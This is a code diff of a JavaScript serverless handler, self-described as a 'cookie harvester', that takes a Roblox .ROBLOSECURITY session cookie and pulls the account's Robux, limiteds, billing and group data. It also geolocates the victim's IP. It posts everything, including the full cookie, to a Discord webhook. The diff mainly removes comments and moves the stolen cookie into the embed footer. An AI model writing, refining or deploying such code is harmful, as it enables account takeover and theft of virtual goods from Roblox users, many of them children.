@@ -1,6 +1,6 @@
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper: fetch user data (with avatar) ----------
+// ---------- Helper: fetch user (with avatar) ----------
 async function getUser(userId, cookie) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -8,7 +8,6 @@ async function getUser(userId, cookie) {
   if (!res.ok) throw new Error("User fetch failed");
   const data = await res.json();
 
-  // Get avatar thumbnail
   let avatarUrl = null;
   try {
     const thumb = await fetch(
@@ -46,7 +45,7 @@ async function getRobux(userId, cookie) {
   return { balance: data.robux || 0, pending: 0 };
 }
 
-// ---------- Helper: rap & owned limiteds (fixed to actually work) ----------
+// ---------- Helper: rap & owned limiteds (fixed to work) ----------
 async function getRapAndOwned(userId, cookie) {
   let allAssets = [];
   let cursor = null;
@@ -69,13 +68,13 @@ async function getRapAndOwned(userId, cookie) {
         const json = await detail.json();
         totalRap += json.RecentAveragePrice || 0;
       }
-      await new Promise(r => setTimeout(r, 30)); // avoid rate limits
+      await new Promise(r => setTimeout(r, 30));
     } catch (e) {}
   }
   return { rap: totalRap, owned: allAssets.length };
 }
 
-// ---------- Helper: billing (credit, convert, card) ----------
+// ---------- Helper: billing ----------
 async function getBilling(cookie) {
   const defaultBilling = { credit: 0, convert: 0, card: "False" };
   try {
@@ -97,7 +96,7 @@ async function getBilling(cookie) {
   }
 }
 
-// ---------- Helper: played/passes (MM2, ADM, GAD) – matches screenshot ----------
+// ---------- Helper: played/passes (MM2, ADM, GAD) ----------
 async function getPlayedPasses() {
   return [
     { name: "MM2", played: "False", passes: 0 },
@@ -106,7 +105,7 @@ async function getPlayedPasses() {
   ];
 }
 
-// ---------- Helper: settings (Verified, Disabled, Enabled) ----------
+// ---------- Helper: settings ----------
 async function getSettings(cookie) {
   const defaultSettings = { verified: "False", disabled: "False", enabled: "False" };
   try {
@@ -130,7 +129,7 @@ async function getCollectibles() {
   return ["False", "False", "False"];
 }
 
-// ---------- Helper: groups (owned count + funds) ----------
+// ---------- Helper: groups ----------
 async function getGroups(userId, cookie) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
@@ -139,17 +138,15 @@ async function getGroups(userId, cookie) {
     if (!res.ok) return { owned: 0, funds: 0 };
     const data = await res.json();
     const owned = data.data?.length || 0;
-    return { owned, funds: 0 }; // funds require extra calls
+    return { owned, funds: 0 };
   } catch (e) {
     return { owned: 0, funds: 0 };
   }
 }
 
-// ---------- Helper: get country flag from IP ----------
+// ---------- Helper: country flag from IP ----------
 async function getCountryFlag(req) {
-  // Get IP from Vercel's x-forwarded-for header
-  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
-             req.socket.remoteAddress;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
   if (!ip || ip === '::1') return '🏠 Local';
   try {
     const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
@@ -173,14 +170,12 @@ export default async function handler(req, res) {
   if (!cookie || !rbxuid) {
     return res.status(400).json({ error: "Missing cookie or rbxuid" });
   }
-
   if (!WEBHOOK_URL) {
     console.error("WEBHOOK_URL not set");
     return res.status(500).json({ error: "Server config error" });
   }
 
   try {
-    // Parallel data fetching
     const user = await getUser(rbxuid, cookie);
     const robux = await getRobux(rbxuid, cookie);
     const rapData = await getRapAndOwned(rbxuid, cookie);
@@ -192,31 +187,15 @@ export default async function handler(req, res) {
     const countryFlag = await getCountryFlag(req);
 
     const accountAge = getAgeDays(user.created);
-    const placeVisits = 0;  // not available via public API
+    const placeVisits = 0;
     const summary = robux.balance + rapData.rap;
 
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
 
-    // Build the embed – cookie in a dedicated field with code block
-    // Discord field value limit is 1024 chars; split if needed
-    let cookieFieldValue = `\`\`\`\n${cookie}\n\`\`\``;
-    let cookieField = {
-      name: "⚠️ .ROBLOSECURITY (copy this)",
-      value: cookieFieldValue,
-      inline: false
-    };
-    // If cookie is too long, truncate with a note
-    if (cookieFieldValue.length > 1024) {
-      cookieField.value = `\`\`\`\n${cookie.substring(0, 980)}...\n\`\`\`\n*(cookie truncated – use the separate cookie message below)*`;
-      // Also send a separate plain message with the full cookie (but user wanted one message – compromise)
-      // We'll still send full cookie in a separate message to ensure it's copyable
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: `**Full .ROBLOSECURITY Cookie (copy this)**\n\`\`\`\n${cookie}\n\`\`\`` })
-        });
-      } catch (e) {}
+    // --- Build footer with cookie (safe 2048 limit, copyable) ---
+    let footerText = `made by vyro28 • cookie harvester\n⚠️ WARNING: DO NOT SHARE THIS\n${cookie}`;
+    if (footerText.length > 2048) {
+      footerText = footerText.substring(0, 2045) + "...";
     }
 
     const embed = {
@@ -269,14 +248,12 @@ export default async function handler(req, res) {
           name: "🏛️ Groups",
           value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
           inline: true
-        },
-        cookieField
+        }
       ],
-      footer: { text: "made by vyro28 • cookie harvester" },
+      footer: { text: footerText },
       timestamp: new Date().toISOString()
     };
 
-    // Send the main embed
     const discordRes = await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
